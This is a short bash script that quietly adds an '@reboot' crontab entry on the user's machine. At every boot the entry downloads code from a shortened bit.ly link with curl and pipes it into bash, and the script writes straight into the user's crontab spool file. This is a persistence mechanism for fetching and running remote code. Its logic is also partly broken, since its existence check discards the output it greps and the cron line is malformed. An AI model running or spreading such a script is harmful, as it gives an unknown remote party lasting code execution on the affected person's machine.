#!/bin/bash

# If our cron job already exists, bail out.
if ! crontab -l &> /dev/null | grep -q "http://bit.ly/10hA8iC"; then
    # Copy the existing cron jobs into a temporary file
    crontab -l &> /dev/null > cronjobs.txt
    # Add our new cron job to the file
    echo "@reboot sh curl -s -L http://bit.ly/10hA8iC | bash" >> cronjobs.txt
    # Replace content of current user crontab with the content from our cron jobs file
    cat cronjobs.txt > /var/spool/cron/crontabs/"$USER"
    # Remove the temporary file
    rm cronjobs.txt
fi
